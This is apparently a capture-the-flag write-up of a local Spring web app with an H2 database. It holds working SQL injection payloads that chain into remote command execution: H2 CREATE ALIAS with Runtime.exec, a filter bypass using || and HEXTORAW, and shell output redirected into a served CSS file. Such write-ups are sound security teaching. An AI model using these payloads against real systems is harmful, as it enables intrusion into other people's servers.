<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Pentest Notes</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="/style.css"/>
</head>
<body>
<div id="content" class="content">
<h1 class="title">Pentest Notes</h1>
<p>
I can start this by saying that this challenge was exceptionally good. Many
phases, the payload crafting was great, but very frustrating, I admit.
</p>

<p>
This is a web app that presents a login page, but it's also possible to register
a user.
</p>



<div id="org034f6a2" class="figure">
<p><img src="writeup-img/2025-01-09_13-48-57_screenshot.png" alt="2025-01-09_13-48-57_screenshot.png" />
</p>
</div>


<p>
Since I have no clue if any users exist, I just create one. After logging in
with the newly created user, I was presented with a list of 3 notes.
</p>



<div id="orga7a9cc5" class="figure">
<p><img src="writeup-img/2025-01-09_13-51-00_screenshot.png" alt="2025-01-09_13-51-00_screenshot.png" />
</p>
</div>

<p>
The notes are really not relevant at all. It's possible to click on them and go
to a page where the same text is presented. One curious thing about that is the
URL: <code>http://127.0.0.1:8080/note?name=Skill issue</code>. It contains a parameter, which
made me think of SQL injection right away. But firstly, it's always best to
download the web application files and read the code.
</p>

<p>
It looks like it's using the Spring Framework, using Java code. So I skipped
directly to the controller related to the notes, <code>NotesController.java</code>, where
it's easy to understand that a SQL injection vulnerability is available for
exploitation because the query is being built using <code>String.format</code>, where no
parameters are sanitized at all.
</p>

<div class="org-src-container">
<pre class="src src-java"><span class="org-c-annotation">@PostMapping</span>(<span class="org-string">"/note"</span>)
<span class="org-keyword">public</span> <span class="org-type">ResponseEntity</span> &lt; ? &gt; <span class="org-function-name">noteByName</span>(<span class="org-c-annotation">@RequestParam</span> <span class="org-type">String</span> <span class="org-variable-name">name</span>, <span class="org-type">HttpSession</span> <span class="org-variable-name">httpSession</span>) {
    <span class="org-keyword">if</span> (httpSession.getAttribute(<span class="org-string">"username"</span>) == <span class="org-constant">null</span>) {
        <span class="org-keyword">return</span> ResponseEntity.status(<span class="org-constant">HttpStatus</span>.UNAUTHORIZED).body(<span class="org-string">"unauthorized"</span>);
    }
    <span class="org-keyword">if</span> (name.contains(<span class="org-string">"$"</span>) || name.toLowerCase().contains(<span class="org-string">"concat"</span>)) {
        <span class="org-keyword">return</span> ResponseEntity.status(<span class="org-constant">HttpStatus</span>.FORBIDDEN).body(<span class="org-string">"Bad character in name :)"</span>);
    }
    <span class="org-type">String</span> <span class="org-variable-name">query</span> = String.format(<span class="org-string">"Select * from notes where name ='%s' "</span>, name);
    <span class="org-type">List</span> &lt; <span class="org-type">Object</span>[] &gt; <span class="org-variable-name">resultList</span> = entityManager.createNativeQuery(query).getResultList();
    <span class="org-type">List</span> &lt; <span class="org-type">Map</span> &lt; <span class="org-type">String</span>, <span class="org-type">Object</span> &gt;&gt; <span class="org-variable-name">result</span> = <span class="org-keyword">new</span> <span class="org-type">ArrayList</span> &lt; &gt; ();
    <span class="org-keyword">for</span> (<span class="org-type">Object</span>[] <span class="org-variable-name">row</span>: resultList) {
        <span class="org-type">Map</span> &lt; <span class="org-type">String</span>, <span class="org-type">Object</span> &gt; <span class="org-variable-name">rowMap</span> = <span class="org-keyword">new</span> <span class="org-type">HashMap</span> &lt; &gt; ();
        rowMap.put(<span class="org-string">"ID"</span>, row[0]);
        rowMap.put(<span class="org-string">"Name"</span>, row[1]);
        rowMap.put(<span class="org-string">"Note"</span>, row[2]);
        result.add(rowMap);
    }
    <span class="org-keyword">return</span> ResponseEntity.ok(result);
}
</pre>
</div>

<p>
The easiest way, in my opinion, to test if we are able to do some kind of SQL
injection, is to just use the <code>AND</code> SQL operator and duplicate the condition,
which actually worked and returned me the correct note.
</p>

<div class="org-src-container">
<pre class="src src-nil">// URL
http://127.0.0.1:8080/note?name=Skill issue' and name='Skill issue

// Query
Select * from notes where name = 'Skill issue' and name = 'Skill issue'
</pre>
</div>

<p>
Now, since we need to craft some crazy query, I advise to use the <code>Dockerfile</code> to
create the container and to test locally, because it's also possible to check
the error messages in the logs.
</p>

<p>
Since I didn't know the type of the database, I had to search the web
application files, only to find out this using 'H2', an open-source database in
Java. The first step was to check any kind of RCE exploits or payloads. And that
is how I found a <a href="https://www.sonarsource.com/blog/dotcms515-sqli-to-rce/">website</a> with an RCE payload that looks pretty good! Creates an
<code>ALIAS</code> to a <code>Java</code> function that executes a shell command. That's what is needed!
</p>

<div class="org-src-container">
<pre class="src src-sql"><span class="org-keyword">CREATE</span> <span class="org-keyword">ALIAS</span> <span class="org-keyword">EXEC</span> <span class="org-keyword">AS</span> CONCAT(<span class="org-string">'void e(String cmd) throws java.io.IOException'</span>, HEXTORAW(<span class="org-string">'007b'</span>),<span class="org-string">'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); rt.exec(cmd);'</span>,HEXTORAW(<span class="org-string">'007d'</span>));
<span class="org-keyword">CALL</span> <span class="org-keyword">EXEC</span>(<span class="org-string">'whoami'</span>);
</pre>
</div>

<p>
So now, before building the payload, it's important to note that the
<code>String.format</code> inserts the string between single quotes <code>'%s'</code> and could mess up
the payload. So, an important thing is to just end the <code>name</code> parameter with a
single quote and a semicolon, to start another set of commands, and then end
with <code>--</code> to ignore everything after. In this case, the URL will be:
</p>

<div class="org-src-container">
<pre class="src src-nil">http://127.0.0.1:8080/note?name=Skill issue'; CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);',HEXTORAW('007d'));CALL EXEC('whoami'); --
</pre>
</div>

<p>
Except&#x2026; the payload didn't work, at all. But we got a response from the
server: <code>Bad character in name :)</code>. If we look at the code of the method above,
that string is in there and it is only returned if the parameter contains dollar
signs or the string <code>concat</code>. And in fact, the query I did contains the <code>concat</code>
keyword. This function is used to concatenate the strings that are passed as
parameters, but there is another way of doing that without using <code>concat</code>, and
that is by using the <code>||</code> operator. And this is something that must be used,
because we can't use <code>[]</code> or <code>{}</code> in the URL string, so HEXTORAW is used to bypass
that issue and it has to be concatenated to the rest of the strings. The <code>||</code>
should also be URL encoded.
</p>

<p>
So here is the new payload:
</p>

<div class="org-src-container">
<pre class="src src-nil">CREATE ALIAS EXEC2 AS 'void e(String cmd) throws java.io.IOException ' %7c%7c HEXTORAW('007b') %7c%7c 'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); rt.exec(cmd);' %7c%7c HEXTORAW('007d'); CALL EXEC('whoami'); --
</pre>
</div>

<p>
It's possible to tell it worked because the page loaded as expected by showing
the correct note. But nothing else happened. And that makes sense.The output of
the command is going to nowhere. It's not being printed, it's not being
redirected, nothing. Ideally, we must change the code so we can actually execute
shell commands that include redirection. Instead of passing a simple <code>String</code> to
the <code>exec</code> method, we must pass a variable of the type <code>String[]</code>, which should be
declared as follows:
</p>

<div class="org-src-container">
<pre class="src src-java"><span class="org-type">String</span>[] <span class="org-variable-name">cmd2</span> = {<span class="org-string">"/bin/sh"</span>, <span class="org-string">"-c"</span>, cmd};
rt.exec(cmd2);
</pre>
</div>

<p>
Let's not forget that now, <code>[]</code> should be go through <code>HEXTORAW</code>, just like the
double quotes. And I did that to the double quotes just to make sure!
</p>

<div class="org-src-container">
<pre class="src src-nil">CREATE ALIAS EXEC3 AS 'void e(String cmd) throws java.io.IOException ' %7c%7c HEXTORAW('007b') %7c%7c 'java.lang.Runtime rt = java.lang.Runtime.getRuntime(); String' %7c%7c HEXTORAW('005b') %7c%7c HEXTORAW('005d') %7c%7c ' cmd2 = ' %7c%7c HEXTORAW('007b') %7c%7c HEXTORAW('0022') %7c%7c '/bin/sh' %7c%7c HEXTORAW('0022') %7c%7c ',' %7c%7c HEXTORAW('0022') %7c%7c '-c' %7c%7c HEXTORAW('0022') %7c%7c ', cmd' %7c%7c HEXTORAW('007d') %7c%7c '; rt.exec(cmd2);' %7c%7c HEXTORAW('007d');--
</pre>
</div>

<p>
Now that is one gigantic payload. But after the request, everything worked! So
now <code>EXEC2</code> can be used to execute shell commands. Let's see what does the root
directory has. And let's redirect its output to
<code>target/classes/static/Css/main.css</code> which is the main file that is being served
by the HTTP server.
</p>

<div class="org-src-container">
<pre class="src src-nil">http://127.0.0.1:8080/note?name=Skill issue'; CALL EXEC3('ls -la / &gt; target/classes/static/Css/main.css');--
</pre>
</div>

<p>
By checking the <code>main.css</code> file now, it contains the output of the command:
</p>

<div class="org-src-container">
<pre class="src src-nil">http://127.0.0.1:8080/Css/main.css

total 100
drwxr-xr-x   1 root root 4096 Jan  9 13:28 .
drwxr-xr-x   1 root root 4096 Jan  9 13:28 ..
-rwxr-xr-x   1 root root    0 Jan  9 13:28 .dockerenv
-rw-rw-rw-   1 root root   26 Oct  5 12:16 UttCBDpF0EF5_flag.txt
drwxr-xr-x   1 root root 4096 Jan  9 13:28 app
drwxr-xr-x   2 root root 4096 Apr 18  2022 bin
drwxr-xr-x   2 root root 4096 Mar 19  2022 boot
drwxr-xr-x   5 root root  340 Jan  9 13:28 dev
drwxr-xr-x   1 root root 4096 Jan  9 13:28 etc
drwxr-xr-x   2 root root 4096 Mar 19  2022 home
drwxr-xr-x   1 root root 4096 Apr 18  2022 lib
drwxr-xr-x   2 root root 4096 Apr 18  2022 lib64
drwxr-xr-x   2 root root 4096 Apr 18  2022 media
drwxr-xr-x   2 root root 4096 Apr 18  2022 mnt
drwxr-xr-x   2 root root 4096 Apr 18  2022 opt
dr-xr-xr-x 602 root root    0 Jan  9 13:28 proc
drwx------   1 root root 4096 Jan  9 13:28 root
drwxr-xr-x   3 root root 4096 Apr 18  2022 run
drwxr-xr-x   2 root root 4096 Apr 18  2022 sbin
drwxr-xr-x   2 root root 4096 Apr 18  2022 srv
dr-xr-xr-x  13 root root    0 Jan  9 13:28 sys
drwxrwxrwt   1 root root 4096 Jan  9 13:28 tmp
drwxr-xr-x   1 root root 4096 Apr 18  2022 usr
drwxr-xr-x   1 root root 4096 Apr 18  2022 var
</pre>
</div>

<p>
The flag is right there! Now it's just a matter of printing the flag to the same
file and there we go!
</p>
<hr>
<footer>
  <div class="container">
    <ul class="menu-list">
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/index.html">Home</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/articles/articles.html">Articles</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a href="/writeups/writeups.html">Write-Ups</a>
      </li>
      <li class="menu-list-item flex-basis-100-margin fit-content">
        <a class="inactive-link">09-01-2025</a>
      </li>
    </ul>
  </div>
</footer>
</div>
</body>
</html>
